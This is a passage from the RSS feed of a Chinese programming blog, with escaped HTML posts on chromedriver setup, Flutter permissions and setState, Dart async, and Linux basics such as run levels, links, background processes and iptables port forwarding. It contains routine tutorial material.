&lt;span style=&#34;color:#75715e&#34;&gt;# 检验版本&lt;/span&gt;
google&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;chrome &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;version
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2chromedriver配置使用&#34;&gt;2.chromedriver配置使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 前往 https://npm.taobao.org/mirrors/chromedriver/ 下载对应的 A-WebDriver&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 建议将 A-WebDriver 上传到路径 /usr/local/bin 以添加到环境中，这样在编写脚本时不需要指定路径&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数配置----------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webs&lt;/span&gt;(unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TestCase):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;setUp&lt;/span&gt;(self):
        options &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ChromeOptions()
        options&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--no-sandbox&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# 不在沙盒运行，以Root权限运行&lt;/span&gt;
        options&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--headless&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# 必须添加这两个参数，否则会出现权限不够的问题&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Chrome(options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;options) &lt;span style=&#34;color:#75715e&#34;&gt;# WebDriver已添加到环境中&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—为真机添加网络权限</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E4%B8%BA%E7%9C%9F%E6%9C%BA%E6%B7%BB%E5%8A%A0%E7%BD%91%E7%BB%9C%E6%9D%83%E9%99%90/</link>
        <pubDate>Fri, 14 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E4%B8%BA%E7%9C%9F%E6%9C%BA%E6%B7%BB%E5%8A%A0%E7%BD%91%E7%BB%9C%E6%9D%83%E9%99%90/</guid>
        <description>&lt;h2 id=&#34;1网络权限&#34;&gt;1.网络权限&lt;/h2&gt;
&lt;p&gt;在 AndroidManifest.xml 中添加下列代码，注意不要放到 application 中.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;// android/app/src/main/AndroidManifest.xml
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;uses-permission&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;android.permission.READ_PHONE_STATE&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;uses-permission&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;android.permission.INTERNET&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;uses-permission&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;android.permission.ACCESS_NETWORK_STATE&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;uses-permission&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;android.permission.ACCESS_WIFI_STATE&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—一般问题</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E4%B8%80%E8%88%AC%E9%97%AE%E9%A2%98/</link>
        <pubDate>Fri, 14 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E4%B8%80%E8%88%AC%E9%97%AE%E9%A2%98/</guid>
        <description>&lt;h2 id=&#34;1linux-系统里buffer-和-cache-如何区分&#34;&gt;1.linux 系统里，buffer 和 cache 如何区分？&lt;/h2&gt;
&lt;p&gt;buffer 和 cache 都是内存中的一块区域，区别在于一个是储存时使用，一个在读取时使用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当 CPU 需要写数据到磁盘时，由于磁盘速度比较慢，所以 CPU 先把数据存进 buffer，然后 CPU 去执行其他任务，然后将 buffer 中的数据定期写入磁盘；&lt;/li&gt;
&lt;li&gt;当 CPU 需要从磁盘读入数据时，由于磁盘速度比较慢，可以把即将用到的数据提前存入 cache，CPU 可以直接从 cache 中拿数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3描述-linux-运行级别-0-6-的各自含义&#34;&gt;3.描述 Linux 运行级别 0-6 的各自含义&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;0：关机模式&lt;/li&gt;
&lt;li&gt;1：单用户模式（ 可在该模式下修改 root 密码 ）&lt;/li&gt;
&lt;li&gt;2：无网络支持的多用户模式&lt;/li&gt;
&lt;li&gt;3：有网络支持的多用户模式（文本模式，工作中最常用的模式 ）&lt;/li&gt;
&lt;li&gt;4：保留，未使用&lt;/li&gt;
&lt;li&gt;5：有网络支持的多用户窗口模式（ 桌面模式 ）&lt;/li&gt;
&lt;li&gt;6：重新引导系统，即重启&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4描述-linux-系统从开机到登陆界面的启动过程&#34;&gt;4.描述 Linux 系统从开机到登陆界面的启动过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;开机 BIOS 自检，加载硬盘&lt;/li&gt;
&lt;li&gt;读取 MBR，MBR 引导&lt;/li&gt;
&lt;li&gt;grub 引导菜单 ( Boot Loader )&lt;/li&gt;
&lt;li&gt;加载内核 kernel&lt;/li&gt;
&lt;li&gt;启动 init 进程，依据 inittab 文件设定运行级别&lt;/li&gt;
&lt;li&gt;init 进程，执行 rc.sysinit 文件&lt;/li&gt;
&lt;li&gt;启动内核模块，执行不同级别的脚本程序&lt;/li&gt;
&lt;li&gt;执行 /etc/rc.d/rc.local&lt;/li&gt;
&lt;li&gt;启动 mingetty，进入系统登陆界面&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;5描述-linux-下软链接和硬链接的区别&#34;&gt;5.描述 Linux 下软链接和硬链接的区别&lt;/h2&gt;
&lt;p&gt;在 Linux 系统中，链接分为两种，一种是硬链接（Hard link），另一种称为符号链接或软链接（Symbolic Link）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;默认不带参数的情况下，ln 创建的是硬链接，带 -s 参数的 ln 命令创建的是软链接。&lt;/li&gt;
&lt;li&gt;硬链接文件与源文件的 inode 节点号相同，而软链接文件的 inode 节点号，与源文件不同，&lt;/li&gt;
&lt;li&gt;ln 命令不能对目录创建硬链接，但可以创建软链接。对目录的软链接会经常使用到。&lt;/li&gt;
&lt;li&gt;删除软链接文件，对源文件和硬链接文件无任何影响。&lt;/li&gt;
&lt;li&gt;删除文件的硬链接文件，对源文件及软链接文件无任何影响。&lt;/li&gt;
&lt;li&gt;删除链接文件的源文件，对硬链接文件无影响，会导致其软链接失效（红底白字闪烁状）。&lt;/li&gt;
&lt;li&gt;同时删除源文件及其硬链接文件，整个文件才会被真正的删除。&lt;/li&gt;
&lt;li&gt;很多硬件设备的快照功能，使用的就是类似硬链接的原理。&lt;/li&gt;
&lt;li&gt;软链接可以跨文件系统，硬链接不可以跨文件系统。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6shell-脚本中--标记的用途是什么&#34;&gt;6.shell 脚本中 $? 标记的用途是什么&lt;/h2&gt;
&lt;p&gt;在写一个 shell 脚本时，如果你想要检查前一命令是否执行成功，可以在 if 条件中使用 $? 可以来检查前一命令的结束状态。简单的例子如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@localhost:~# ls /usr/bin/
root@localhost:~# echo $?
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;如果结束状态是 0，说明前一个命令执行成功。&lt;/li&gt;
&lt;li&gt;如果结束状态不是 0，说明命令执行失败。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;9将本地的-80-端口的请求转发到-8080-端口本机地址-1000254写出命令&#34;&gt;9.将本地的 80 端口的请求转发到 8080 端口，本机地址 10.0.0.254，写出命令&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ iptables -t nat -A PREROUTING -d 10.0.0.254 -p tcp --dprot 80 -j DNAT --to-destination 10.0.0.254:8080
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Flutter—关闭界面</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E5%85%B3%E9%97%AD%E7%95%8C%E9%9D%A2/</link>
        <pubDate>Thu, 13 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E5%85%B3%E9%97%AD%E7%95%8C%E9%9D%A2/</guid>
        <description>&lt;h2 id=&#34;1pop&#34;&gt;1.POP&lt;/h2&gt;
&lt;p&gt;通过将将当前界面 pop 出来关闭界面&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Navigator.pop(context);
Navigator.of(context).pop();
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Linux—后台程序的运行及关闭</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E5%90%8E%E5%8F%B0%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E5%8F%8A%E5%85%B3%E9%97%AD/</link>
        <pubDate>Thu, 13 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E5%90%8E%E5%8F%B0%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E5%8F%8A%E5%85%B3%E9%97%AD/</guid>
        <description>&lt;h2 id=&#34;1实现后台执行程序&#34;&gt;1.实现后台执行程序&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#后台执行程序&lt;/span&gt;
nohup python test&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; run&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#查看后台程序&lt;/span&gt;
ps aux &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test.sh&amp;#34;&lt;/span&gt;  
&lt;span style=&#34;color:#75715e&#34;&gt;# a:显示所有程序  u:以用户为主的格式来显示   x:显示所有程序，不以终端机来区分&lt;/span&gt;
ps &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;ef &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test.sh&amp;#34;&lt;/span&gt;  
&lt;span style=&#34;color:#75715e&#34;&gt;# -e显示所有进程。-f全格式。&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 关闭后台程序kill 1001&lt;/span&gt;
kill &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1001&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#-9表示强制关闭&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 根据名称删除&lt;/span&gt;
pkill &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;f Chrome
&lt;span style=&#34;color:#75715e&#34;&gt;# kill 对应的是 PID&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# pkill 对应的是COMMAND&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2linux后台运行命令nohup和的区别&#34;&gt;2.linux后台运行命令nohup和&amp;amp;的区别&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&amp;amp;&lt;/strong&gt;：表示程序在后台运行，当执行./a.out &amp;amp; 的时候，即使你使用ctrl+C，a.out照样运行（因为对SIGINT信号免疫）。但是要注意，如果你直接关掉shell，那么，a.out进程会停止关闭。可见，&amp;amp;的后台并不硬（因为对SIGHUP信号不免疫）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nohup&lt;/strong&gt;：表示的是忽略SIGHUP信号，所以当运行nohup ./a.out时，关闭shell，a.out还是在运行（对SIGHUP信号免疫）。但是，如果直接在shell中使用Ctrl+C，那么，a.out进程会停止关闭（因为对SIGINT信号不免疫）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以， &amp;amp;和nohup两者并没有直接关系， 要让进程真正不受shell中Ctrl+C和shell关闭的影响，最好是使用命令 nohua ./a.out &amp;amp;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Flutter—setState 更新原理和流程</title>
        <link>https://ac-lm.github.io/posts/flutter/fluttersetstate-%E6%9B%B4%E6%96%B0%E5%8E%9F%E7%90%86%E5%92%8C%E6%B5%81%E7%A8%8B/</link>
        <pubDate>Wed, 12 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/fluttersetstate-%E6%9B%B4%E6%96%B0%E5%8E%9F%E7%90%86%E5%92%8C%E6%B5%81%E7%A8%8B/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/271803637&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Flutter的setState更新原理和流程 @flutter开发精选 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1flutter-的状态类&#34;&gt;1.Flutter 的状态类&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;StatelessWidget：无状态类，没有状态更新，界面一经创建无法更改&lt;/li&gt;
&lt;li&gt;StatefulWidget：有状态类，当状态改变，调用 setState() 方法会触发 StatefulWidget 的 UI 状态更新，自定义继承 StatefulWidget 的子类须重写 createState() 方法&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2mounted&#34;&gt;2.mounted&lt;/h2&gt;
&lt;p&gt;调用 setState() 必须是没有调用过 dispose() 方法，不然出错，可通过 mounted 属性来判断调用此方法是否合法。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if (mounted) {
  setState(() {});
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3流程&#34;&gt;3.流程&lt;/h2&gt;
&lt;h3 id=&#34;a条件判断&#34;&gt;a.条件判断&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1.生命周期判断&lt;/li&gt;
&lt;li&gt;2.是否可以进行刷新：mounted&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;b添加脏链表-_dirty--true&#34;&gt;b.添加脏链表 _dirty = true&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1.脏链表是待更新的链表&lt;/li&gt;
&lt;li&gt;2.更新过后就不脏了&lt;/li&gt;
&lt;li&gt;3._active=false 的时候直接返回&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;c管理类&#34;&gt;c.管理类&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;告诉管理类方法自己需要被重新构建&lt;/li&gt;
&lt;li&gt;owner.scheduleBuildFor(this)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;d调用-windowscheduleframe-native-方法&#34;&gt;d.调用 window.scheduleFrame() =&amp;gt;native 方法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;RegisterNatives() 完成 native 方法的注册&lt;/li&gt;
&lt;li&gt;最终会注册 vsync 回调。 等待下一次 vsync 信号的到来，&lt;/li&gt;
&lt;li&gt;然后再经过层层调用最终会调用到 Window::BeginFrame()&lt;/li&gt;
&lt;li&gt;UI 的绘制逻辑是在 Render 树中实现的&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;e更新帧信号来临从而刷新需要重构的界面&#34;&gt;e.更新帧信号来临从而刷新需要重构的界面&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在 drawFrame 中调用 buildOwner.buildScope(renderViewElement) 更新 elements&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Flutter—读取 app 安装包资源</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E8%AF%BB%E5%8F%96-app-%E5%AE%89%E8%A3%85%E5%8C%85%E8%B5%84%E6%BA%90/</link>
        <pubDate>Tue, 11 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E8%AF%BB%E5%8F%96-app-%E5%AE%89%E8%A3%85%E5%8C%85%E8%B5%84%E6%BA%90/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/243259521&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Flutter 读取应用资源并显示  @飘香豆腐 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1资源加载&#34;&gt;1.资源加载&lt;/h2&gt;
&lt;p&gt;在 flutter 中，如果需要加载资源的话，需要在 pubspec.yaml 指定 APP 所需要的资源。这样的话，指定的每个 Asset （资源）都会被打包在 APP 中，并且在 APP 运行时可以访问到这些资源。&lt;/p&gt;
&lt;p&gt;最常见的 Asset 类型就是图片，指定图片资源后即可以在 APP 页面使用图片控件加载资源了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pubspec.yaml&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;flutter&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;assets&lt;/span&gt;:
        - &lt;span style=&#34;color:#ae81ff&#34;&gt;assets/images/logo.png&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// lib/main.dart
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;Image.asset(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;assets/images/logo.png&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用-rootbundle-对象访问资源&#34;&gt;2.使用 rootBundle 对象访问资源&lt;/h2&gt;
&lt;p&gt;APP 还可以通过引入 services 包使用 rootBundle 对象来访问资源。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;package:flutter/services.dart&amp;#39;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;比如访问文件 test.txt，txt 文件内容是 测试文字，可以使用 rootBundle 对象的 loadString 方法。当然，前提也是需要在 pubspec.yaml 中指定资源才能访问的到。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;rootBundle.loadString(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;assets/txt/test.txt&amp;#39;&lt;/span&gt;).then((data){
    print(data);
});

&lt;span style=&#34;color:#75715e&#34;&gt;// 测试文字
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为 loadString() 返回的是 Future，所以需要用 then() 接受返回的 String 类型的数据。Future 类似于 ES6 中的 Promise，当异步任务执行完成后会把结果返回给 then()。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Flutter—主题颜色</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E4%B8%BB%E9%A2%98%E9%A2%9C%E8%89%B2/</link>
        <pubDate>Mon, 10 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E4%B8%BB%E9%A2%98%E9%A2%9C%E8%89%B2/</guid>
        <description>&lt;h2 id=&#34;1primaryswatch&#34;&gt;1.primarySwatch&lt;/h2&gt;
&lt;p&gt;flutter 的主题（build下面的theme）中有个主题颜色（primarySwatch），该主题颜色(primarySwatch)只有以下的几个值可以选择，其他的暂不支持:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;red,
pink,
purple,
deepPurple,
indigo,
blue,
lightBlue,
cyan,
teal,
green,
lightGreen,
lime,
yellow,
amber,
orange,
deepOrange,
brown,
blueGrey,
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2primarycolor&#34;&gt;2.primaryColor&lt;/h2&gt;
&lt;p&gt;如果要把顶部导航栏和状态栏的颜色修改成黑色或者白色，需要用到这个属性。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;primaryColor:Colors.white
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Dart—异步</title>
        <link>https://ac-lm.github.io/posts/dart/dart%E5%BC%82%E6%AD%A5/</link>
        <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/dart/dart%E5%BC%82%E6%AD%A5/</guid>
        <description>&lt;h2 id=&#34;dart---单线程语言&#34;&gt;Dart - 单线程语言&lt;/h2&gt;
&lt;p&gt;Dart 是一个单线程编程语言。如果任何代码阻塞线程执行都会导致程序卡死。为了避免此类情况出现，Dart 使用 Future 对象表示异步操作。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Synchronous code
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;printDailyNewsDigest() {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; news &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gatherNewsReports(); &lt;span style=&#34;color:#75715e&#34;&gt;// Can take a while.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  print(news);
}

main() {
  printDailyNewsDigest();
  printWinningLotteryNumbers();
  printWeatherForecast();
  printBaseballScore();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在上述示例代码中，存在一个问题函数 printDailyNewsDigest，该函数是阻塞的，在这之后的代码都必须等待 printDailyNewsDigest 结束才能继续执行。因此为了程序能及时响应，Dart 的作者使用异步编程模型 Future 处理可能耗时的函数。&lt;/p&gt;
&lt;h2 id=&#34;什么是-future&#34;&gt;什么是 Future&lt;/h2&gt;
&lt;p&gt;Future 表示在将来某时获取一个值的方式。当一个返回 Future 的函数被调用的时候，程序做了两件事情：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;函数把自己放入队列和返回一个未完成的 Future 对象&lt;/li&gt;
&lt;li&gt;当值可用时，Future 带着值变成完成状态。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;async-和-await&#34;&gt;async 和 await&lt;/h2&gt;
&lt;p&gt;async 和 await 关键字是 Dart 异步支持的一部分。他们允许你像写同步代码一样写异步代码和不需要使用 Future 接口。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dart:async&amp;#39;&lt;/span&gt;;

printDailyNewsDigest() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; news &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; gatherNewsReports();
  print(news);
}

main() {
  printDailyNewsDigest();
  printWinningLotteryNumbers();
  printWeatherForecast();
  printBaseballScore();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如上述示例代码，在这时 printDailyNewsDigest 虽然是第一个调用的，但是最后打印的。这是因为代码读取和打印内容是异步执行的。&lt;/p&gt;
&lt;p&gt;在这个例子中，printDailyNewsDigest 调用 gatherNewsReports 并不会阻塞程序。gatherNewsReports 会把自己放入队列，返回一个 Future 让程序正常执行下去，在 gatherNewsReports 完成收集新闻过后程序再来进行打印。&lt;/p&gt;
&lt;p&gt;下面的图展示代码的执行流程。每一个数字对应着相应的步骤&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291909670.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291909670.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开始程序执行&lt;/li&gt;
&lt;li&gt;main 函数调用 printDailyNewsDigest，因为它被标记为 async，所有在该函数任何代码被执行之前立即返回一个 Future&lt;/li&gt;
&lt;li&gt;剩下的打印执行。因为它们是同步的。所有只有当一个打印函数执行完成过后才能执行下一个打印函数。例如：中奖号码在天气预报执行打印。&lt;/li&gt;
&lt;li&gt;函数 printDailyNewsDigest 函数体开始执行&lt;/li&gt;
&lt;li&gt;在到达 await 之后，调用 gatherNewsReports，程序暂停，等待 gatherNewsReports 返回的 Future 完成。&lt;/li&gt;
&lt;li&gt;当 Future 完成，printDailyNewsDigest 继续执行，打印新闻。&lt;/li&gt;
